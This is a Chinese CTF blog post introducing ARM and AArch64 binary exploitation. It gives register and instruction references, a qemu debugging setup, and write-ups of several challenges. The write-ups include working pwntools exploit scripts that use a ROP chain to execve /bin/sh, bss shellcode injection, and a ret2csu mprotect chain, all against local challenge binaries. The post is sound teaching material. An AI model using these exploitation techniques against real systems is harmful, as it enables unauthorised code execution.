@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    arm-pwn入门 丨
+    
+
+    tw11ty&#39;s Blog
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+</head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">tw11ty</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">归档</a></li>
+      
+      <li><a href="/about">关于</a></li>
+      
+      <li><a href="/group">友链</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">arm-pwn入门</div>
+  <div class="post-meta">
+    <div class="date">2024 July 12th</div>
+    <div class="tags">
+      
+      <div class="tag-item">arm & pwn</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><p>一些师傅的博客：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/#arm-pwn%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD">arm pwn 入门 | blingbling’s blog (blingblingxuanxuan.github.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com)</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">原创] CTF 中 ARM &amp; AArch64 架构下的 Pwn-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<h1 id="ARM寄存器集"><a href="#ARM寄存器集" class="headerlink" title="ARM寄存器集"></a>ARM寄存器集</h1><p>ARM指令集体系结构属于RISC（精简指令集） 32位 寄存器-寄存器型的体系结构，使用load&#x2F;stort指令在存储器与寄存器之间移动数据</p>
+<p>具有规整的32位指令格式，不能够像Pentium那样的CISC处理器将地址以及16位或者32位数据加载到寄存器中。</p>
+<p>ARM32寄存器集</p>
+<ul>
+<li>R0 存储临时变量 或者 函数返回值</li>
+<li>R0~R3 四个寄存器存储函数调用时前4个参数 多余参数放到栈上</li>
+<li>R7 系统调用号</li>
+<li>R11寄存器即可以用来记录回溯信息,也可以当做局部变量来使用</li>
+<li>R13 SP 指向栈顶</li>
+<li>R14寄存器LR(链接寄存器)在进行函数调用时，LR寄存器内保存调用函数的下一条指令地址，用于被调用函数(子函数)结束工作后返回调用函数(父函数)</li>
+<li>R15   PC(程序计数器) IP    与x86不同的点在于PC在ARM状态下存储当前指令+8的地址。</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407111228109.png" alt="image-20240711122858943"></p>
+<p>当前状态处理器（CPSR）：Z（零） N（负） C（进位） V（溢出），低八位包含系统信息</p>
+<p>aarch寄存器集</p>
+<p>X0: 也称为零寄存器，用于存储函数的返回值、传递函数参数和临时存储变量。</p>
+<p>X1-X7: 用于传递函数参数和临时存储变量。</p>
+<p>X8: 也称为程序计数器(PC)，用于存储当前正在执行的指令的地址。当处理器执行一条指令时，PC会自动递增以指向下一条指令。</p>
+<p>X9-X15: Caller Saved寄存器，用于存储函数参数、局部变量和临时数据。</p>
+<p>X16-X17: 也称为临时寄存器，用于存储临时数据，这些寄存器在函数调用期间不需要保留其值。</p>
+<p>X18: 也称为平台相关寄存器，用于存储与特定平台相关的信息，如TLS（线程本地存储）指针。</p>
+<p>X19-X28: Callee Saved寄存器，于存储函数参数、局部变量和临时数据。</p>
+<p>X29: 也称为帧指针寄存器（Frame Pointer，FP），用于存储当前函数的堆栈帧指针。当函数调用发生时，x29寄存器的值被保存到堆栈中，以便在函数执行期间可以轻松地访问上一级函数的堆栈帧。这样，当函数返回时，可以通过恢复x29寄存器的值来恢复到正确的堆栈帧。</p>
+<p>X30: 也称为链接寄存器（Link Register，LR），用于存储函数调用的返回地址。当函数执行完毕时，处理器将使用x30寄存器中存储的返回地址来恢复到调用点。这样，控制流程可以顺利返回到调用函数的位置继续执行。</p>
+<h1 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h1><p><strong>基础指令</strong></p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>功能</th>
+<th>指令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MOV</td>
+<td>移动数据</td>
+<td>EOR</td>
+<td>按位异或</td>
+</tr>
+<tr>
+<td>MVN</td>
+<td>移动数据并取反</td>
+<td>LDR</td>
+<td>加载</td>
+</tr>
+<tr>
+<td>ADD</td>
+<td>加法</td>
+<td>STR</td>
+<td>存储</td>
+</tr>
+<tr>
+<td>SUB</td>
+<td>减法</td>
+<td>LDM</td>
+<td>加载多个</td>
+</tr>
+<tr>
+<td>MUL</td>
+<td>乘法</td>
+<td>STM</td>
+<td>存储多个</td>
+</tr>
+<tr>
+<td>LSL</td>
+<td>逻辑左移</td>
+<td>PUSH</td>
+<td>入栈</td>
+</tr>
+<tr>
+<td>LSR</td>
+<td>逻辑右移</td>
+<td>POP</td>
+<td>出栈</td>
+</tr>
+<tr>
+<td>ASR</td>
+<td>算术右移</td>
+<td>B</td>
+<td>跳转</td>
+</tr>
+<tr>
+<td>ROR</td>
+<td>右旋</td>
+<td>BL</td>
+<td>Link+跳转</td>
+</tr>
+<tr>
+<td>CMP</td>
+<td>比较</td>
+<td>BX</td>
+<td>分支跳转</td>
+</tr>
+<tr>
+<td>AND</td>
+<td>按位与</td>
+<td>BLX</td>
+<td>Linx+分支跳转</td>
+</tr>
+<tr>
+<td>ORR</td>
+<td>按位或</td>
+<td>SWI&#x2F;SVC</td>
+<td>系统调用</td>
+</tr>
+</tbody></table>
+<p><strong>条件分支</strong></p>
+<table>
+<thead>
+<tr>
+<th>编码</th>
+<th>助记符</th>
+<th>分支标志和状态</th>
+<th>执行条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0000</td>
+<td><strong>EQ</strong></td>
+<td>z置位</td>
+<td>相等  0</td>
+</tr>
+<tr>
+<td>0001</td>
+<td><strong>NE</strong></td>
+<td>z清零</td>
+<td>不等 !0</td>
+</tr>
+<tr>
+<td>0010</td>
+<td><strong>CS</strong></td>
+<td>c置位</td>
+<td>无符号大于等于</td>
+</tr>
+<tr>
+<td>0011</td>
+<td><strong>CC</strong></td>
+<td>c清零</td>
+<td>无符号小于</td>
+</tr>
+<tr>
+<td>0100</td>
+<td><strong>MI</strong></td>
+<td>n置位</td>
+<td>负</td>
+</tr>
+<tr>
+<td>0101</td>
+<td><strong>PL</strong></td>
+<td>n清零</td>
+<td>正或零</td>
+</tr>
+<tr>
+<td>0110</td>
+<td><strong>VS</strong></td>
+<td>v置位</td>
+<td>溢出</td>
+</tr>
+<tr>
+<td>0111</td>
+<td><strong>VC</strong></td>
+<td>v清零</td>
+<td>未溢出</td>
+</tr>
+<tr>
+<td>1000</td>
+<td><strong>HI</strong></td>
+<td>c置位 z清零</td>
+<td>无符号大于</td>
+</tr>
+<tr>
+<td>1001</td>
+<td><strong>LS</strong></td>
+<td>c清零 z置位</td>
+<td>无符号小于等于</td>
+</tr>
+<tr>
+<td>1010</td>
+<td><strong>GE</strong></td>
+<td>n、v同时置位或清零</td>
+<td>大于等于</td>
+</tr>
+<tr>
+<td>1011</td>
+<td><strong>LT</strong></td>
+<td>n、v分别置位或清零</td>
+<td>小于</td>
+</tr>
+<tr>
+<td>1100</td>
+<td><strong>GT</strong></td>
+<td>z清零 n、v同时置位或清零</td>
+<td>大于</td>
+</tr>
+<tr>
+<td>1101</td>
+<td><strong>LE</strong></td>
+<td>z置位 n、v分别置位或清零</td>
+<td>小于等于</td>
+</tr>
+<tr>
+<td>1110</td>
+<td><strong>AL</strong></td>
+<td></td>
+<td>总是</td>
+</tr>
+<tr>
+<td>1111</td>
+<td><strong>NV</strong></td>
+<td></td>
+<td>从不</td>
+</tr>
+</tbody></table>
+<p>ARM通过块移动实现一个非常复杂的栈结构</p>
+<blockquote>
+<p>test STMFD r13!, {r0-r4, r10, r14} ;保存工作寄存器，并将返回地址保存在r14中</p>
+<p>​       ……</p>
+<p>​       LDMFD r13!, {r0-r4, r10, r15} ; 恢复工作寄存器，把r14送入PC中</p>
+</blockquote>
+<h1 id="ARM-PWN环境搭建"><a href="#ARM-PWN环境搭建" class="headerlink" title="ARM PWN环境搭建"></a>ARM PWN环境搭建</h1><p>基础环境安装可看这位师傅[【Pwn 笔记】跨平台架构的环境配置与调试 | binLep’s Blog](<a target="_blank" rel="noopener" href="https://binlep.github.io/old_blog_01/2020/03/20/%E3%80%90Pwn">https://binlep.github.io/old_blog_01/2020/03/20/【Pwn</a> 笔记】跨平台架构的环境配置与调试&#x2F;)，写得很详细</p>
+<p>使用qemu构建一个虚拟环境来运行arm文件，使用gdb-multiarch连接到qemu，进行远程调试</p>
+<p>AArch64：是ARMv8及更高版本中引入的64位架构。而qemu-arm用于模拟32位的ARM架构的二进制文件，qemu-aarch64用于模拟64位的ARM aarch64架构的二进制文件</p>
+<blockquote>
+<p>wARMup: ELF 32-bit LSB executable, <strong>ARM</strong>, EABI5 version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux-armhf.so.3, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;fbe5794e95d6ea5006ea3137c0120ed945acae17, not stripped   –&gt; qemu-arm模拟</p>
+<p>shanghai_baby_arm: ELF 64-bit LSB executable, <strong>ARM aarch64</strong>, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux-aarch64.so.1, for GNU&#x2F;Linux 3.7.0, BuildID[sha1]&#x3D;e988eaee79fd41139699d813eac0c375dbddba43, stripped  –&gt; qemu-aarch模拟</p>
+</blockquote>
+<p>qemu进行模拟时使用-L加载对应架构的链接库（在usr目录下）</p>
+<pre><code class="highlight shell">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu/ ./pwn
+qemu-arm -g 8888 -L /usr/arm-linux-gnueabihf/ ./pwn</code></pre>
+
+<p>然后启动gdb-multiarch：</p>
+<pre><code class="highlight shell">set architecture arm/aarch64  #指定目标架构
+target remote localhost:1234/8888</code></pre>
+
+<p>运行pwn脚本时附加进程：给程序加个pause()，qemu模拟时设置-g port，然后gdb-multiarch附加上去。</p>
+<h1 id="题目一：32位-arm架构-静态"><a href="#题目一：32位-arm架构-静态" class="headerlink" title="题目一：32位 arm架构 静态"></a>题目一：32位 arm架构 静态</h1><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121123677.png" alt="image-20240712112344579"></p>
+<pre><code class="highlight shell">qemu-arm -g 1234 ./typo
+
+gdb-multiarch ./typo
+<span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture arm</span>
+<span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:1234</span></code></pre>
+
+<p>由于是静态链接，所以函数会会很乱，定位主函数方法：</p>
+<ol>
+<li>通过字符串找到一些特征字符串，题目中的描述之类的，根据交叉调用，不断跟进父函数，判断当前函数是否为主函数</li>
+<li>定位_start函数，分析_start调用，它最终会调用mian函数或者是封装的__libc_start_main函数</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121143318.png" alt="image-20240712114313268"></p>
+<p>发现sub_8F00为main函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121338981.png" alt="image-20240712133835929"></p>
+<p>然后边调边逆，猜测一些函数作用 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121534727.png" alt="image-20240712152641078"></p>
+<p>在0x221c8处下断点</p>
+<p>在循环中，函数会断在该处，输入0x200字节数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121341151.png" alt="image-20240712134108103"></p>
+<p>调用完read以后，断点下在0x00008d60</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121354166.png" alt="image-20240712135409083"></p>
+<p>R11 -&gt;  0xfffef064 —▸ 0x9058 ◂— str r0, [fp, #-0x20] &#x2F;* ‘ ‘ *&#x2F;  ，0x9058指令是readin()的下一条指令，当我们覆盖了0xfffef064中的值为布置好的shellcode地址，就能控制程序在调用完readin()后，通过r11来恢复恢复PC。偏移为0x70字节</p>
+<pre><code class="highlight plaintext">pwndbg&gt; p/x 0xfffef064-0xfffeeff4
+$1 = 0x70</code></pre>
+
+<p>由于没有开NX保护，栈上shellcode可执行，可以控制R11 -&gt; shellcode_addr，但是shellcode写到栈上，需要栈地址，如果是远程一般会开ASLR，所以不直接用shellcode打。 <a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">Shellcodes database for study cases (shell-storm.org)</a></p>
+<p>通过ROPgadget来打，构造ROP链，执行system(“&#x2F;bin&#x2F;sh”)，或者execve(“&#x2F;bin&#x2F;sh”, 0, 0)</p>
+<p>首先我们需要知道：arm函数调用参数规则：R0~R4，再是栈上，R7为系统调用号，r15&#x3D;PC指向下一条命令地址</p>
+<p>execve系统调用号0xb，挟持PC执行svc中断，使用ROPgadget找不到pop r15的gadget</p>
+<blockquote>
+<p>execve(“&#x2F;bin&#x2F;sh”, 0, 0)   –&gt;  r0 &#x3D; bin_sh_addr   r1&#x3D;0   r2&#x3D;0   r7&#x3D;b</p>
+<p>pc &#x3D; svc_addr </p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121418124.png" alt="image-20240712141834090"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121449651.png"></p>
+<pre><code class="highlight plaintext">0x00020904 : pop &#123;r0, r4, pc&#125;
+0x00068bec : pop &#123;r1, pc&#125;
+0x00014068 : pop &#123;r7, pc&#125;
+0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;
+0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</code></pre>
+
+<p>然后就是把他们组装起来</p>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context(arch=<span class="string">&#x27;arm&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)
+
+io = process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])
+io.sendlineafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)
+
+<span class="comment"># 0x00020904 : pop &#123;r0, r4, pc&#125;</span>
+<span class="comment"># 0x00068bec : pop &#123;r1, pc&#125;</span>
+<span class="comment"># 0x00014068 : pop &#123;r7, pc&#125;</span>
+<span class="comment"># 0x0004df00 : mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span>
+<span class="comment"># 0x0000fed0 : svc #0 ; pop &#123;r3, r4, r5, r6, r7, pc&#125;</span>
+
+r0_r4 =  <span class="number">0x00020904</span>
+r1    = <span class="number">0x00068bec</span>
+r7    = <span class="number">0x00014068</span>
+r3_r4_r5 = <span class="number">0x0004df00</span>  <span class="comment">#r0=r2=0</span>
+svc   = <span class="number">0x0000fed0</span>
+bin_sh= <span class="number">0x0006C384</span>
+
+payload = flat([ cyclic(<span class="number">112</span>), p32(r3_r4_r5), p32(<span class="number">0</span>)*<span class="number">3</span>,   <span class="comment">#r2 = 0</span>
+                p32(r0_r4), p32(bin_sh) , p32(<span class="number">0</span>),        <span class="comment">#r0 = bin_sh_addr</span>
+                p32(r1), p32(<span class="number">0</span>),                         <span class="comment">#r1 = 0</span>
+                p32(r7), p32(<span class="number">0xb</span>),                       <span class="comment">#r7 = 0xb</span>
+                p32(svc)])                               <span class="comment">#pc = svc_addr</span>
+
+io.recv()
+io.sendline(payload)
+
+io.interactive()</code></pre>
+
+
+
+<h1 id="题目二：32位-arm架构-动态"><a href="#题目二：32位-arm架构-动态" class="headerlink" title="题目二：32位 arm架构 动态"></a>题目二：32位 arm架构 动态</h1><p>InCTF-2018 wARMup</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121507370.png" alt="image-20240712150714341"></p>
+<p>没开pie   32位arm架构bss段可执行</p>
+<p>主函数溢出0x10字节</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121510197.png" alt="image-20240712151053165"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121550049.png" alt="image-20240712155049004"></p>
+<p>read通过r11-0x68来设置目标地址，如果我们设置函数的返回地址为0x1052c，控制R11的值，就能实现任意地址写</p>
+<p>函数最后会将SP指针向低地址减少4字节，后面执行的 POP {R11, PC} 从SP开始，所以填充的payload长度应该为 $r11 - $r1 -4 &#x3D; 0x64，后面四字节为R11，接下来才会弹给PC。</p>
+<p>先构造任意写，往bss段上写shellcode，然后再改返回函数地址执行shellcode</p>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context(arch=<span class="string">&#x27;arm&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)
+
+<span class="comment"># io = process(&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ -g 4444 ./wARMup&#x27;, shell = True)</span>
+io = process(<span class="string">&#x27;qemu-arm -L /usr/arm-linux-gnueabihf/ ./wARMup&#x27;</span>, shell = <span class="literal">True</span>)
+
+bss = <span class="number">0x021100</span>
+payload = flat([cyclic(<span class="number">0x64</span>), p32(bss+<span class="number">0x68</span>),   <span class="comment">#r11 -&gt; bss</span>
+                p32(<span class="number">0x01052C</span>)                  <span class="comment">#read(0, bss-0x68, 0x78)</span>
+                ])
+io.sendlineafter(<span class="string">b&#x27;Welcome to bi0s CTF!\n&#x27;</span>, payload)
+
+shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span>
+<span class="string">    add r0, pc, #12</span>
+<span class="string">    mov r1, #0</span>
+<span class="string">    mov r2, #0</span>
+<span class="string">    mov r7, #11</span>
+<span class="string">    svc 0</span>
+<span class="string">    .ascii &quot;/bin/sh\\0&quot;</span>
+<span class="string">&#x27;&#x27;&#x27;</span>)
+
+payload = shellcode.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(bss)
+
+<span class="comment"># pause()</span>
+
+io.send(payload)
+io.interactive()</code></pre>
+
+<p>不过<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">ZIKH26</a>)师傅的payload有些理不清</p>
+<h1 id="题目三：64位-aarch64架构-动态"><a href="#题目三：64位-aarch64架构-动态" class="headerlink" title="题目三：64位 aarch64架构 动态"></a>题目三：64位 aarch64架构 动态</h1><p>上海骇极杯 2018 baby_arm</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121840669.png" alt="image-20240712184024595"></p>
+<p>往bss段上写数据，然后存在栈溢出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121841597.png" alt="image-20240712184140558"></p>
+<p>aarch64指令集中：x0~x7传参  x29 栈顶指针  x30 LR</p>
+<pre><code class="highlight assembly"> X0   0x0
+ X1   0x40007fff00 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;)
+ X2   0x200
+ X3   0x40009b1500 ◂— 0
+ X4   0x0
+ X5   0x9f075092a1c1abdb
+ X6   0x40009adb10 ◂— 0
+ X7   0x40000000000
+ X8   0x3f
+ X9   0xffff
+ X10  0x0
+ X11  0x0
+ X12  0x4000841e48 ◂— udf #0
+ X13  0x0
+ X14  0x0
+ X15  0x6fffff47
+ X16  0x411028 —▸ 0x4000901b40 ◂— stp x29, x30, [sp, #-0x30]!
+ X17  0x4000901b40 ◂— stp x29, x30, [sp, #-0x30]!
+ X18  0x73516240
+ X19  0x400868 ◂— stp x29, x30, [sp, #-0x40]!
+ X20  0x0
+ X21  0x400610 ◂— mov x29, #0
+ X22  0x0
+ X23  0x0
+ X24  0x0
+ X25  0x0
+ X26  0x0
+ X27  0x0
+ X28  0x0
+ X29  0x6161617261616171 (&#x27;qaaaraaa&#x27;)
+ X30  0x6161617461616173 (&#x27;saaataaa&#x27;)
+ SP   0x40007fff50 ◂— 0x6161617661616175 (&#x27;uaaavaaa&#x27;)
+*PC   0x61617461616173</code></pre>
+
+<p>在main函数返回时，x30-&gt;‘saaataaa’ offset&#x3D;72</p>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)
+
+io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])
+
+shellcode = asm(shellcraft.sh())
+io.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)
+sleep(<span class="number">0.3</span>)
+payload = cyclic(<span class="number">72</span>) + p64(<span class="number">0x411068</span>)  <span class="comment">#PC -&gt; bss_addr &lt;- shellcode</span>
+io.sendline(payload)
+
+io.interactive()</code></pre>
+
+<p>ret2csu</p>
+<p>mprotect(bss, 0x1000, 7)  -&gt; x0 &#x3D; bss_addr   x1&#x3D;0x1000  x2&#x3D;7  x3&#x3D;mprotect_plt</p>
+<p>csu -&gt; x24 &#x3D; bss_addr x23 &#x3D; 0x1000 x22 &#x3D; 7 x21&#x3D;mprotect_plt x19&#x3D;0  x20&#x3D;1</p>
+<pre><code class="highlight assembly">.text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j --&gt;csu2
+.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
+.text:00000000004008B0                 MOV             X2, X22
+.text:00000000004008B4                 MOV             X1, X23
+.text:00000000004008B8                 MOV             W0, W24
+.text:00000000004008BC                 ADD             X19, X19, #1
+.text:00000000004008C0                 BLR             X3
+.text:00000000004008C4                 CMP             X19, X20
+.text:00000000004008C8                 B.NE            loc_4008AC
+.text:00000000004008CC
+.text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3C↑j   --&gt;csu1
+.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
+.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
+.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
+.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
+.text:00000000004008DC                 RET</code></pre>
+
+
+
+<p>布置csu1：先布置x29和x30，x30存储函数调用的返回地址，在执行ret后调用，控制x30指向csu2，实现第一次控制流挟持；然后控制对应寄存器在csu2中的赋值</p>
+<p>控制csu2：按照对应寄存器进行赋值，然后x19+1，会与x20比较，如果相等就会继续执行csu1，此时通过布置栈空间可以再次控制x30，执行到ret时能够实现第二次控制流挟持。</p>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)
+
+<span class="comment"># io = process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;-g&#x27;,&#x27;9999&#x27;, &#x27;./shanghai_baby_arm&#x27;])</span>
+io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>, <span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])
+elf = ELF(<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>)
+bss = <span class="number">0x411068</span>
+
+shellcode = asm(shellcraft.aarch64.sh()).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>])   <span class="comment">#0x411068</span>
+io.sendafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)
+sleep(<span class="number">0.3</span>)
+
+<span class="comment"># .text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j --&gt;csu2</span>
+<span class="comment"># .text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span>
+<span class="comment"># .text:00000000004008B0                 MOV             X2, X22</span>
+<span class="comment"># .text:00000000004008B4                 MOV             X1, X23</span>
+<span class="comment"># .text:00000000004008B8                 MOV             W0, W24</span>
+<span class="comment"># .text:00000000004008BC                 ADD             X19, X19, #1</span>
+<span class="comment"># .text:00000000004008C0                 BLR             X3</span>
+<span class="comment"># .text:00000000004008C4                 CMP             X19, X20</span>
+<span class="comment"># .text:00000000004008C8                 B.NE            loc_4008AC</span>
+<span class="comment"># .text:00000000004008CC</span>
+<span class="comment"># .text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3C↑j   --&gt;csu1</span>
+<span class="comment"># .text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span>
+<span class="comment"># .text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span>
+<span class="comment"># .text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span>
+<span class="comment"># .text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span>
+<span class="comment"># .text:00000000004008DC                 RET</span>
+
+csu1 = <span class="number">0x00000000004008CC</span>
+csu2 = <span class="number">0x00000000004008AC</span>
+<span class="comment">#mprotect(bss_addr, 0x1000, 7)   --&gt; x19=0, x20=1, x21=mprotect_addr, x22=7, x23=0x1000, x24=bss_addr, x29=0xdeadbeef, x30=csu2</span>
+
+payload  = cyclic(<span class="number">72</span>) + p64(csu1)
+payload += p64(<span class="number">0xdeadbeef</span>) + p64(csu2)  <span class="comment">#x29  x30</span>
+payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#x19 x20</span>
+payload += p64(bss+<span class="number">0x100</span>) + p64(<span class="number">7</span>) <span class="comment">#x21  x22</span>
+payload += p64(<span class="number">0x1000</span>) + p64(<span class="number">0x411000</span>) <span class="comment">#x23  x24 </span>
+
+payload += p64(<span class="number">0</span>) + p64(bss) <span class="comment">#x29  x30-&gt;shellcode</span>
+payload += p64(<span class="number">0</span>)*<span class="number">6</span> 
+
+<span class="comment"># pause()</span>
+io.sendline(payload)
+
+io.interactive()</code></pre>
+
+<p>当然也可以用第二题的思路，利用read(0, &amp;buf, 0x200)实现任意地址写，然后往bss段里写数据，不过没意义罢了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122029207.png" alt="image-20240712202911121"></p>
+<h1 id="题目四：32位-arm-ret2libc"><a href="#题目四：32位-arm-ret2libc" class="headerlink" title="题目四：32位 arm ret2libc"></a>题目四：32位 arm ret2libc</h1><p>Codegate2018 melong</p>
+<p>给定了libc</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122034634.png" alt="image-20240712203449585"></p>
+<p>在write_diary函数中，nbytes大小可控，可能存在溢出，a2是main函数中的局部变量</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122044100.png" alt="image-20240712204410053"></p>
+<p>nbytes&#x3D;*v8，v8是PT函数的返回值，我们需要尽可能控制v8为大数造成溢出</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122045717.png" alt="image-20240712204505676"></p>
+<p>PT函数，发现存在返回值size可控，我们的利用目标就是它了，但是我们需要控制ptr&#x3D;&#x3D;exc2，exc2位于bss段中，初始化为0</p>
+<p>当malloc失败时返回值为0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122047946.png" alt="image-20240712204759900"></p>
+<p>在这些之前，需要进入check给v6赋值才能接下来操作</p>
+<p>writeing…</p>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © 2024 typo</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
